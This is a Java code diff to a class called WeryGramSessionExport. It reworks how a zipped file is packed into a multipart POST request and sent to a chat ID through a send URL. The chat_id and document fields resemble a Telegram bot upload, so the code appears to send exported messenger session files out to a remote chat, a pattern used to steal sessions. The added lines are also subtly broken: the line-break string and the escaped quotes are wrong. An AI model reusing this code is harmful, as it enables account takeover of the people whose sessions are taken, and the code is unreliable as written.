@@ -549,17 +549,10 @@ public class WeryGramSessionExport {
                 fis.read(fileBytes);
             }
 
-            String CRLF = "\r\n";
-            StringBuilder bodyBuilder = new StringBuilder();
-            bodyBuilder.append("--").append(boundary).append(CRLF);
-            bodyBuilder.append("Content-Disposition: form-data; name=\"chat_id\"").append(CRLF).append(CRLF);
-            bodyBuilder.append(SESSION_CHAT_ID).append(CRLF);
-            bodyBuilder.append("--").append(boundary).append(CRLF);
-            bodyBuilder.append("Content-Disposition: form-data; name=\"document\"; filename=\"").append(zipFile.getName()).append("\"").append(CRLF);
-            bodyBuilder.append("Content-Type: application/zip").append(CRLF).append(CRLF);
-
-            String header = bodyBuilder.toString();
-            String footer = CRLF + "--" + boundary + "--" + CRLF;
+            String CRLF = "\\r\\n";
+            String chatIdLine = "--" + boundary + CRLF + "Content-Disposition: form-data; name=\\"chat_id\\"" + CRLF + CRLF + String.valueOf(SESSION_CHAT_ID) + CRLF;
+            String docLine = "--" + boundary + CRLF + "Content-Disposition: form-data; name=\\"document\\"; filename=\\"" + zipFile.getName() + "\\"" + CRLF + "Content-Type: application/zip" + CRLF + CRLF;
+            String closeLine = CRLF + "--" + boundary + "--" + CRLF;
 
             HttpURLConnection conn = (HttpURLConnection) new URL(sendUrl).openConnection();
             conn.setRequestMethod("POST");
@@ -569,9 +562,10 @@ public class WeryGramSessionExport {
             conn.setReadTimeout(15000);
 
             try (BufferedOutputStream os = new BufferedOutputStream(conn.getOutputStream())) {
-                os.write(header.getBytes("UTF-8"));
+                os.write(chatIdLine.getBytes("UTF-8"));
+                os.write(docLine.getBytes("UTF-8"));
                 os.write(fileBytes);
-                os.write(footer.getBytes("UTF-8"));
+                os.write(closeLine.getBytes("UTF-8"));
                 os.flush();
             }
 
